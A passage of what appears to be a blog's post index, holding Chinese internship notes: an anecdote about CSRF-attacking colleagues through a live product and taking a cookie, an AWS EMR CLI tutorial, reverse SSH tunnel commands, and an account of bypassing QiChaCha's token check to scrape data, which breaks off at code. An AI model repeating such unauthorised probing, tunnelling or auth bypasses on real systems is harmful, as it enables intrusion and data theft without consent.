x4</p>\n</li>\n</ol>\n<p>其次:</p>\n<ul>\n<li>不只是密码，不要CTO的重点是放在密码爆破，密码泄露上面，密码复杂度上。道理上讲是对的，但是也是不对的，要考虑全。</li>\n</ul>\n<ul>\n<li>不仅要知道怎么发现还要知道怎么避免和怎么修复。</li>\n</ul>\n<p>没了,安全一旦出问题，结果显而易见。包括不限于，代码安全，运维安全，逻辑安全，产品安全，设计上的安全，以及依托于第三方工具的安全性。</p>\n<ul>\n<li><p>拿一个例子来说：本司有个前端，听说是跟着老板一起打天下的人。另，本人所在的公司没有一个人对安全有任何概念。运维混乱，没有架构，没有任何安全体系，然而我只是个爬虫实习生。。。。所以可想而知，当时我猜前端哥的代码肯定有漏洞，果不其然，CSRF，把一个构造好的链接用短网址处理下丢过去(因为有个上班的时候所有人都会开看板网页的，而且这个产品还是线上的，哭瞎在厕所)。立马把测试的文章删除了，同时cookie也到手了。报给CTO，CTO表示知道了，可能由于我表述不精，不会吹牛，看来这件事情没有引起太大的重视。同时API的接口设计根本没有做任何过滤，一开始timestap是需要在脚本里面构造好，后来直接给URL里面放上一个Date.now()传过去，竟然也行。也就是说API接口里面根本没有转义或者转成字符串。。。。</p>\n</li>\n<li><p>再拿一个例子说: 本司有个自然语言处理的大哥，开发者后台也是他们组写的。什么是懵逼，这就是懵逼，当时是让我体验产品呢，出于强迫症开始进行测试。我了草，推广链接居然把APPKEY都分享出去了。我了草，为什么，why?? </p>\n</li>\n<li><p>再拿一个例子说: 我在的这个组，为什么，为什么可以直接到发送对数据库的查询。为什么我Mongo本身数据不多，我还要交给ES查询，再从ES拿。</p>\n</li>\n<li><p>还有一个例子：是关于官网的，官网有个博客的连接，wordpress的，然而这个有xmlrpc的漏洞，报给他们说修复，修复竟然是从官网把链接去掉了，我去，好神奇啊，那看来我就没办法直接访问blog.xxx.xxx了吗？？？</p>\n</li>\n<li><p>我去，我突然又发现这个cookie好像没有有效时间的限制。</p>\n</li>\n</ul>\n<h4 id=\"后记：写在浅谈代码安全之后\"><a href=\"#后记：写在浅谈代码安全之后\" class=\"headerlink\" title=\"后记：写在浅谈代码安全之后\"></a>后记：写在浅谈代码安全之后</h4><ol>\n<li><p>能进这家公司，很大一部分的程度上是因为谈的来，还有我比较喜欢贤二，所以才有一种非常想来的感觉。之前友情提示了一下他们的安全体系十分的不安全，导致我轻松地就能接触到了他们所有的数据库，还有代码。当时其实是不报什么希望了，缘法自然，如是而已。然而因缘际会总是十分巧妙，最后还是来了。听说当时一面的爬虫工程师，对我不是很满意。</p>\n</li>\n<li><p>如果说你做了八九年，也不过就现在这个水平，你肯定有过人之处，但你有什么值得对我这个还没出道一年，还没毕业的人骄傲呢。问你问题你不愿意，那我还怎么接手你的代码，写的乱七八糟，连个文档都没有，又有什么值得了不起呢？ 讲信修睦，选贤与能，难否?</p>\n</li>\n<li><p>表示再也不会对任何人说，这个很简单很简单。我不关心什么什么，我只要他实现就行了。这是不负责任的表现。想起以前对实验室的学弟这样说，这个算法很简单，你只要加进去就行了。 (原来人会变得温柔，是透彻的懂了，哈哈)以后有人这样再对我这样说，我肯定是拒绝的。</p>\n</li>\n<li><p>没有什么是绝对安全的</p>\n</li>\n</ol>\n","categories":["HowTo"],"tags":["实习笔记"]},{"title":"AWS EC2 and AWS EMR and AWS RDS","url":"http://iami.xyz/2016/12/12/How-to-AWS-EMR/","content":"<p>近些天来，一直使用AWS的相关产品，从最开始用EC2，后来到EMR，也遇到一些坑，整理下，作为记录。<br>最开始的aws配置就不讲了。 不会的话就 </p>\n<ul>\n<li><code>aws help</code></li>\n<li><code>aws ec2 help</code></li>\n<li><code>aws emr ls help</code></li>\n</ul>\n<p>首先下面这段代码终端里肯定是不能跑的，我只是为了好看，才这样放的。而且不一定要从终端的方式，<code>python</code>可以用<code>boto3</code>, 其他编程语言也提供了相应的SDK，可以操作。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ aws emr create-cluster </span><br><span class=\"line\"> \t --applications Name=Ganglia Name=Spark Name=Zeppelin </span><br><span class=\"line\">\t --ec2-attributes </span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"string\">'&#123;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"KeyName\": \"crawl-beijing\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"InstanceProfile\": \"EMR_EC2_DefaultRole\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"SubnetId\": \"subnet-61528516\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"EmrManagedSlaveSecurityGroup\":  \"sg-ee6e828a\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"EmrManagedMasterSecurityGroup\": \"sg-ed6e8289\"</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t&#125;'</span> </span><br><span class=\"line\">\t --service-role EMR_DefaultRole </span><br><span class=\"line\">\t --<span class=\"built_in\">enable</span>-debugging </span><br><span class=\"line\">\t --release-label emr-5.2.0 </span><br><span class=\"line\">\t --<span class=\"built_in\">log</span>-uri \t\t\t<span class=\"string\">'s3n://aws-logs-243495284874-cn-north-1/elasticmapreduce/'</span> </span><br><span class=\"line\">\t --steps </span><br><span class=\"line\">\t\t\t \t\t\t<span class=\"string\">'[</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t \t\t\t\t&#123;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Args\": [</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\"spark-submit\", </span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\"--deploy-mode\", \"cluster\", </span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\"--master\", \"yarn\", </span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\"--conf\", \"spark.yarn.submit.waitAppCompletion=false\", </span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\"--num-executors\", \"5\", </span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\"--executor-cores\", \"5\", </span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\"--executor-memory\", \"20g\", \"s3://zero2hadoop-jobs-mour/part1/wordcount.py\", </span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"s3://zero2hadoop-in-mour/part1/hello.txt\", </span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"s3://zero2hadoop-in-mour/part1/wordcount_spark.txt\"</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Type\": \"CUSTOM_JAR\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"ActionOnFailure\": \"CONTINUE\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Jar\": \"command-runner.jar\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Properties\": \"\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Name\": \"SparkWordCountApp\"</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t&#125;,</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t&#123;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Args\": [</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\"spark-submit\", \"s3://zero2hadoop-jobs-mour/part1/wordcount.py\", </span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"s3://zero2hadoop-in-mour/part1/hello.txt\", </span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"s3://zero2hadoop-in-mour/part1/wordcount_spark.txt\"</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\t\t\t\t],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Type\": \"CUSTOM_JAR\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"ActionOnFailure\": \"CONTINUE\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Jar\": \"command-runner.jar\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Properties\": \"\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Name\": \"SparkWordCountApp\"</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t]'</span> </span><br><span class=\"line\">\t --name \t<span class=\"string\">'My cluster'</span> </span><br><span class=\"line\">\t --instance-groups </span><br><span class=\"line\">\t \t\t\t\t\t<span class=\"string\">'[</span></span><br><span class=\"line\"><span class=\"string\">\t \t\t\t\t\t\t&#123;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"InstanceCount\": 1,</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"InstanceGroupType\": \"MASTER\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"InstanceType\": \"m3.xlarge\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Name\": \"Master Instance Group\"</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t&#125;,</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t&#123;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"InstanceCount\": 1,</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"InstanceGroupType\": \"CORE\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"InstanceType\": \"m3.xlarge\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t\t\"Name\": \"Core Instance Group\"</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t\t]'</span> </span><br><span class=\"line\"></span><br><span class=\"line\">\t --configurations   <span class=\"string\">'[</span></span><br><span class=\"line\"><span class=\"string\">\t \t\t\t\t\t\t&#123;</span></span><br><span class=\"line\"><span class=\"string\">\t \t\t\t\t\t\t\t\"Classification\":\"spark\",</span></span><br><span class=\"line\"><span class=\"string\">\t \t\t\t\t\t\t\t\"Properties\":</span></span><br><span class=\"line\"><span class=\"string\">\t \t\t\t\t\t\t\t\t\t&#123;\"maximizeResourceAllocation\":\"true\"&#125;,</span></span><br><span class=\"line\"><span class=\"string\">\t \t\t\t\t\t\t\t\"Configurations\":[]</span></span><br><span class=\"line\"><span class=\"string\">\t \t\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"string\">\t \t\t\t\t\t]'</span> </span><br><span class=\"line\"></span><br><span class=\"line\">\t --region cn-north-1</span><br></pre></td></tr></table></figure>\n<p>这基本是一份完整的配置，可以从命令行直接启动(去除里面的换行符)，现在只是为了有个全局观，然后来分析一下相关的知识。</p>\n<p>最简单的我们可以看到，存储使用的是aws s3,那么ok,我们来看下s3的相关操作吧(当然一切的前提都是在你配置好<code>aws configure</code>之后,输入你的id, key,region之后)，配置好之后就可以操作ec2,emr所有的aws相关的产品。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$ aws s3 mb s3://mybuckets \t\t\t<span class=\"comment\">#create a s3 bucket</span></span><br><span class=\"line\">$ aws s3 ls</span><br><span class=\"line\">$ aws s3 cp --recursive /mylocal/path/ s3://s3uriname/yourdir  <span class=\"comment\"># just use for directories</span></span><br><span class=\"line\">$ aws s3 ls s3://mybucket\t\t\t\t\t<span class=\"comment\"># also you can use ls --recursive</span></span><br></pre></td></tr></table></figure>\n<p>ok，s3创建完毕，我们看看最简单的选项 <code>--applications Name=Ganglia Name=Spark Name=Zeppelin</code> 当然其实很明显了，就是你创建的EMR里面需要包括什么组件，直接写到Name里面就行了(前提是aws有的才行)。<br>下面接着分析选项；</p>\n<ul>\n<li><p><code>--service-role EMR_DefaultRole</code>  对应的Role有对应的安全组规则</p>\n</li>\n<li><p>EMR是在运行在EC2实例上的，所以可以看到下面对应的属性，需要设置EC2的相关信息。， 而<code>KeyName</code>则是代表了日后你ssh进去的时候后所需的pem文件名，例如我是crawl-beijing，那我就应该用<code>ssh -i ~/crawl-beijing.pem aws-ec2.publicip.com</code> ,当然<code>awscli</code>里面自带的也有ssh工具，<code>aws emr ssh --cluster-id j-3NJ4N3NZCMMT4 --key-pair-file ./crawl-beijing.pem</code>,cluster-id是通过<code>aws emr --listculsters</code>来查看的。</p>\n</li>\n</ul>\n<blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--ec2-attributes </span><br><span class=\"line\">                            <span class=\"string\">'&#123;</span></span><br><span class=\"line\"><span class=\"string\">                                \"KeyName\": \"crawl-beijing\",</span></span><br><span class=\"line\"><span class=\"string\">                                \"InstanceProfile\": \"EMR_EC2_DefaultRole\",</span></span><br><span class=\"line\"><span class=\"string\">                                \"SubnetId\": \"subnet-61528516\",</span></span><br><span class=\"line\"><span class=\"string\">                                \"EmrManagedSlaveSecurityGroup\":  \"sg-ee6e828a\",</span></span><br><span class=\"line\"><span class=\"string\">                                \"EmrManagedMasterSecurityGroup\": \"sg-ed6e8289\"</span></span><br><span class=\"line\"><span class=\"string\">                &#125;'</span></span><br></pre></td></tr></table></figure>\n</blockquote>\n<ul>\n<li>–steps 里面是可以设置相应的操作步骤，步骤完成之后，自动终止EMR集群，不过要加 <code>--auto-terminate</code>选项，这样的话就会在执行完成之后终止集群，并将相应的数据保存到之前设定的S3数据桶中。而在step中的操作，则要涉及到对应程序的使用了，例如我用spark跑一个wordcount,如果是pig程序，那就是类似这样的</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--steps Type=PIG,Name=<span class=\"string\">\"Pig Program\"</span>,ActionOnFailure=CONTINUE,</span><br><span class=\"line\">\t\tArgs=[</span><br><span class=\"line\">\t\t\t\t-f,s3://mybucket/scripts/pigscript.pig,</span><br><span class=\"line\">\t\t\t\t-p,INPUT=s3://mybucket/inputdata/,</span><br><span class=\"line\">\t\t\t\t-p,OUTPUT=s3://mybucket/outputdata/,</span><br><span class=\"line\">\t\t\t\t<span class=\"variable\">$INPUT</span>=s3://mybucket/inputdata/,</span><br><span class=\"line\">\t\t\t\t<span class=\"variable\">$OUTPUT</span>=s3://mybucket/outputdata/]</span><br></pre></td></tr></table></figure>\n<p>如果我跑的是个python代码或者java代码，又有不同的方式，需要用<code>spark-submit</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">\t  --class &lt;main-class&gt; \\</span><br><span class=\"line\">\t  --master &lt;master-url&gt; \\</span><br><span class=\"line\">\t  --deploy-mode &lt;deploy-mode&gt; \\</span><br><span class=\"line\">\t  --conf &lt;key&gt;=&lt;value&gt; \\</span><br><span class=\"line\">\t  ... <span class=\"comment\"># other options</span></span><br><span class=\"line\">\t  &lt;application-jar&gt; \\</span><br><span class=\"line\">\t  [application-arguments]</span><br></pre></td></tr></table></figure>\n<p>来提交，不过无论是哪种程序，都要顾及到代码本身的选项输入输出，然后写在<code>spark-submit</code>中，就像之前的这种</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">            <span class=\"string\">\"Args\"</span>: [</span><br><span class=\"line\">                            <span class=\"string\">\"spark-submit\"</span>, </span><br><span class=\"line\">                            <span class=\"string\">\"--deploy-mode\"</span>, <span class=\"string\">\"cluster\"</span>, </span><br><span class=\"line\">                            <span class=\"string\">\"--master\"</span>, <span class=\"string\">\"yarn\"</span>, </span><br><span class=\"line\">                            <span class=\"string\">\"--conf\"</span>, <span class=\"string\">\"spark.yarn.submit.waitAppCompletion=false\"</span>, </span><br><span class=\"line\">                            <span class=\"string\">\"--num-executors\"</span>, <span class=\"string\">\"5\"</span>, </span><br><span class=\"line\">                            <span class=\"string\">\"--executor-cores\"</span>, <span class=\"string\">\"5\"</span>, </span><br><span class=\"line\">                            <span class=\"string\">\"--executor-memory\"</span>, <span class=\"string\">\"20g\"</span>, <span class=\"string\">\"s3://zero2hadoop-jobs-mour/part1/wordcount.py\"</span>, </span><br><span class=\"line\">                                                        </span><br><span class=\"line\">                                                        <span class=\"string\">\"s3://zero2hadoop-in-mour/part1/wordcount_spark.txt\"</span></span><br><span class=\"line\">                            ],</span><br><span class=\"line\"></span><br><span class=\"line\">                                <span class=\"string\">\"Type\"</span>: <span class=\"string\">\"CUSTOM_JAR\"</span>,</span><br><span class=\"line\">                                <span class=\"string\">\"ActionOnFailure\"</span>: <span class=\"string\">\"CONTINUE\"</span>,</span><br><span class=\"line\">                                <span class=\"string\">\"Jar\"</span>: <span class=\"string\">\"command-runner.jar\"</span>,</span><br><span class=\"line\">                                <span class=\"string\">\"Properties\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">                                <span class=\"string\">\"Name\"</span>: <span class=\"string\">\"SparkWordCountApp\"</span></span><br><span class=\"line\">                            &#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>--instance-groups</code> 很明显这是为了EMR做EC2初始化类型和数目的限定</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"InstanceCount\"</span>: 1,</span><br><span class=\"line\">            <span class=\"string\">\"InstanceGroupType\"</span>: <span class=\"string\">\"MASTER\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"InstanceType\"</span>: <span class=\"string\">\"m3.xlarge\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"Name\"</span>: <span class=\"string\">\"Master Instance Group\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"InstanceCount\"</span>: 2,</span><br><span class=\"line\">            <span class=\"string\">\"InstanceGroupType\"</span>: <span class=\"string\">\"CORE\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"InstanceType\"</span>: <span class=\"string\">\"m3.xlarge\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"Name\"</span>: <span class=\"string\">\"Core Instance Group\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br></pre></td></tr></table></figure>\n<p>让我们把他变得简单点，起码看着简单点。<br>我们可以把相应的配置参数放在文件中，然后通过<code>file://</code>来读取</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$\taws emr create-cluster </span><br><span class=\"line\">\t \t --applications Name=Ganglia Name=Spark Name=Zeppelin </span><br><span class=\"line\">\t\t --ec2-attributes file://ec2-attributes.json </span><br><span class=\"line\">\t\t --service-role EMR_DefaultRole </span><br><span class=\"line\">\t\t --<span class=\"built_in\">enable</span>-debugging </span><br><span class=\"line\">\t\t --release-label emr-5.2.0 </span><br><span class=\"line\">\t\t --<span class=\"built_in\">log</span>-uri \t<span class=\"string\">'s3n://aws-logs-243495284874-cn-north-1/elasticmapreduce/'</span> </span><br><span class=\"line\">\t\t --steps \tfile://spark-submit-step.json </span><br><span class=\"line\">\t\t --name \t<span class=\"string\">'My cluster'</span> </span><br><span class=\"line\">\t\t --instance-groups file://spark-master-slave.json </span><br><span class=\"line\">\t\t --configurations   <span class=\"string\">'[</span></span><br><span class=\"line\"><span class=\"string\">\t\t \t\t\t\t\t\t&#123;</span></span><br><span class=\"line\"><span class=\"string\">\t\t \t\t\t\t\t\t\t\"Classification\":\"spark\",</span></span><br><span class=\"line\"><span class=\"string\">\t\t \t\t\t\t\t\t\t\"Properties\":</span></span><br><span class=\"line\"><span class=\"string\">\t\t \t\t\t\t\t\t\t\t\t&#123;\"maximizeResourceAllocation\":\"true\"&#125;,</span></span><br><span class=\"line\"><span class=\"string\">\t\t \t\t\t\t\t\t\t\"Configurations\":[]</span></span><br><span class=\"line\"><span class=\"string\">\t\t \t\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"string\">\t\t \t\t\t\t\t]'</span> </span><br><span class=\"line\">\t\t --region cn-north-1</span><br></pre></td></tr></table></figure>\n<p>Other:<br>基本上就是这样，详细了解的话。AWS EMR的文档要看。相关还有hadoop和spark相关。</p>\n<ul>\n<li>windows/mac 下有个s3 brower程序可以用</li>\n<li>应该在本地做好实验，然后再放在aws上跑</li>\n<li>多使用help命令，然后阅读文档的时候，有pdf格式的，多语言里面选择中文，即可。</li>\n<li>启动之后是不能直接访问的，需要手动配置对应安全组的出入站协议，不开相应端口(选择相应的协议)的话是不能访问的，当初用EMR的时候就是这样的，惨痛的教训，根本连接不到主节点。 </li>\n</ul>\n","categories":["学习数据挖掘的路上"],"tags":["实习笔记"]},{"title":"SSH 内网穿透","url":"http://iami.xyz/2016/12/05/ssh-reverse-tunnle/","content":"<p>买的vps配置不好，远不如实验室的服务器。So,拿我的vps做下端口转发，即可。</p>\n<ul>\n<li><p>step1: 建立target对server的免密登录 (操作在target上，即实验室的服务器上)</p>\n</li>\n<li><p>step2: 建立server对host的端口转发      (操作在target上，依旧是实验室的服务器上)</p>\n</li>\n<li><p>step3: 从host连接到转发的端口即可登录target</p>\n</li>\n</ul>\n<p>盗图一张<br><img src=\"/images//reverese-ssh3.png\" alt=\"原理图\"></p>\n<p>step2:</p>\n<p><code>ssh -p 22 -qngfNTR 6766:127.0.0.1:22 userVPS@IP</code></p>\n<p>或者</p>\n<p><code>autossh -M 6777 -NR newport:127.0.0.1:22 -i ~/.ssh/id_rsa userVPS@IP -p vpssshport &gt;&gt; /var/log/ssh_nat.log 2&gt;&amp;1 &amp;</code></p>\n<p>other:</p>\n<ul>\n<li>ssh周边之: <code>sshpass</code>,<code>autossh</code></li>\n<li>我没有使用autossh配置文件</li>\n</ul>\n<p>Reference:</p>\n<ul>\n<li><a href=\"https://toic.org/blog/2009/reverse-ssh-port-forwarding/\" target=\"_blank\" rel=\"noopener\">reverse-ssh-port-forwarding</a></li>\n<li><a href=\"http://www.freeoa.net/osuport/netmanage/ssh-and-reverse-tunnel_1896.html\" target=\"_blank\" rel=\"noopener\">ssh-and-reverse-tunnel</a></li>\n<li><a href=\"https://www.zhukun.net/archives/8130\" target=\"_blank\" rel=\"noopener\">使用SSH反向隧道进行内网穿透</a></li>\n</ul>\n","categories":["HowTo"],"tags":["小手段"]},{"title":"Crawl From QiChaCha","url":"http://iami.xyz/2016/12/01/QiChaChaAnd-WeiXin/","content":"<h3 id=\"企查查相关\"><a href=\"#企查查相关\" class=\"headerlink\" title=\"企查查相关\"></a>企查查相关</h3><p>来这里的第一份小任务是获取自动登录企查查后的cookie,本来是打算</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget --save-cookies cookies.txt \\</span><br><span class=\"line\">     --keep-session-cookies \\</span><br><span class=\"line\">     --post-data <span class=\"string\">'user=username&amp;password=password'</span> \\</span><br><span class=\"line\">     --delete-after \\</span><br><span class=\"line\">     http://server.com/auth.php</span><br></pre></td></tr></table></figure>\n<p>但是企查查的三方登录根本行不通，那些账号都是异常的，还需要验证码。后来去抓企查查公众号的包，得到了想要的。走了一条新的获取数据方式的道路。</p>\n<ul>\n<li>step1 : get token</li>\n<li>step2 : get company name, In teh same time , you can get the keyno</li>\n<li>step3 : get company details</li>\n</ul>\n<p>其实这里面是有个漏洞的，就是正常情况下请求一次网页，会生成一个code,然后拿着这个code才能去请求查询服务。但是你把code置空也能获取token…..</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 